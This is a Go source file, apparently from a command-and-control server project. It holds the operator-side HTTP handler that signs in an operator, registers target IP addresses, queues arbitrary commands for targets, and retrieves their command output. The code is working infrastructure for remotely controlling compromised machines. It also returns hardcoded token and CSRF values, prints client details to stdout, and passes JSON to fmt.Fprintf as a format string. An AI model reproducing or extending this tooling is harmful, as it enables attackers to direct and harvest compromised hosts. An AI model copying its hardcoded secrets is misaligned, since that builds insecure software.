package chttp

import (
	"context"
	_ "encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/mojodojo101/c2server/pkg/client"
	"github.com/mojodojo101/c2server/pkg/models"
	"github.com/sirupsen/logrus"
	"net/http"
	_ "time"
)

const (
	LIST_COMMANDS = iota
	RETRIEVE_COMMAND_RESPONSE
	ADD_NEW_COMMAND
	ADD_NEW_TARGET
)

type ClientRequest struct {
	Id          int64  `json:"id"`
	TId         int64  `json:"t_id"`
	TIpv4       string `json:"t_ipv4"`
	CmdId       int64  `json:"cmd_id"`
	Cmd         string `json:"cmd"`
	Name        string `json:"name"`
	Password    string `json:"password"`
	Token       string `json:"token"`
	CSRFToken   string `json:"csrf_token"`
	RequestType int64  `json:"request_type"`
}
type ClientResponse struct {
	Token        string `json:"token"`
	CSRFToken    string `json:"csrf_token"`
	ResponseType int64  `json:"request_type"`
	Error        bool   `json:"error"`
	Response     string `json:"response"`
}
type ResponseError struct {
	Message string `json:"message"`
}

type ClientHandler struct {
	CUsecase client.Usecase
}

func NewHandler(cu client.Usecase) ClientHandler {
	return ClientHandler{
		CUsecase: cu,
	}

}
func (ch *ClientHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	ctx := context.Background()
	cReq, err := ch.decode(ctx, r)
	if err != nil {
		logrus.Error(err)
		return
	}
	var cResp *ClientResponse
	c, err := ch.signIn(ctx, cReq)
	if err != nil {
		logrus.Error(err)
		return
	}
	switch cReq.RequestType {
	case LIST_COMMANDS:
		cResp, err = ch.listCommandsOfTarget(ctx, c, cReq.TId)
	case ADD_NEW_COMMAND:
		cResp, err = ch.addNewCommand(ctx, c, cReq.TId, cReq.Cmd)
	case RETRIEVE_COMMAND_RESPONSE:
		cResp, err = ch.retrieveCommandResponse(ctx, c, cReq.TId, cReq.CmdId)
	case ADD_NEW_TARGET:
		cResp, err = ch.addNewTarget(ctx, c, cReq.TIpv4)

	}
	if err != nil {
		logrus.Error(err)
	}

	jResp, err := ch.encode(ctx, cResp)
	if err != nil {
		logrus.Error(err)
		return
	}
	fmt.Fprintf(w, jResp)

	return
}

func (ah *ClientHandler) encode(ctx context.Context, cResp *ClientResponse) (string, error) {
	jResp, err := json.Marshal(cResp)
	if err != nil {
		logrus.Error(err)
		return "", err
	}
	return string(jResp), err

}
func (ah *ClientHandler) decode(ctx context.Context, r *http.Request) (*ClientRequest, error) {
	cReq := ClientRequest{}
	err := json.NewDecoder(r.Body).Decode(&cReq)
	if err != nil {
		return nil, errors.New("Could not Unmarshal json, invalid beacon reponse")
	}
	return &cReq, err

}
func (ch *ClientHandler) addNewCommand(ctx context.Context, c *models.Client, tId int64, cmd string) (*ClientResponse, error) {
	err := ch.CUsecase.AddNewCommad(ctx, c, tId, cmd)
	if err != nil {
		return nil, err
	}
	cResp := ClientResponse{}
	cResp.CSRFToken = "2831921092109021093"
	cResp.Token = "2389293829128092109"
	cResp.Error = false
	cResp.ResponseType = ADD_NEW_COMMAND

	return &cResp, err
}

func (ch *ClientHandler) addNewTarget(ctx context.Context, c *models.Client, ipv4 string) (*ClientResponse, error) {
	fmt.Printf("in chttp addNewTarget\n")
	err := ch.CUsecase.AddNewTarget(ctx, c, ipv4)
	if err != nil {
		return nil, err
	}
	cResp := ClientResponse{}
	cResp.CSRFToken = "2831921092109021093"
	cResp.Token = "2389293829128092109"
	cResp.Error = false
	cResp.ResponseType = ADD_NEW_COMMAND

	return &cResp, err
}
func (ch *ClientHandler) retrieveCommandResponse(ctx context.Context, c *models.Client, tId, cmdId int64) (*ClientResponse, error) {
	data, err := ch.CUsecase.RetrieveCommandResponse(ctx, c, tId, cmdId)
	if err != nil {
		return nil, err
	}
	cResp := ClientResponse{}
	cResp.CSRFToken = "2831921092109021093"
	cResp.Token = "2389293829128092109"
	cResp.Error = false
	cResp.ResponseType = RETRIEVE_COMMAND_RESPONSE
	cResp.Response = string(data)
	return &cResp, err
}
func (ch *ClientHandler) listCommandsOfTarget(ctx context.Context, c *models.Client, tId int64) (*ClientResponse, error) {

	cmds, err := ch.CUsecase.ListTargetCommands(ctx, c, tId)
	if err != nil {
		return nil, err
	}

	jcmds, err := json.Marshal(cmds)
	if err != nil {
		return nil, err
	}
	cResp := ClientResponse{}
	cResp.Token = c.Token
	cResp.CSRFToken = c.CSRFToken
	cResp.ResponseType = LIST_COMMANDS
	cResp.Response = string(jcmds)
	return &cResp, err
}
func (ch *ClientHandler) signIn(ctx context.Context, cReq *ClientRequest) (*models.Client, error) {
	c, err := ch.CUsecase.SignIn(ctx, cReq.Name, cReq.Password)
	fmt.Printf("%#v\n", c)
	if err != nil {
		fmt.Printf("couldnt sign in\n")
	}
	return c, err
}
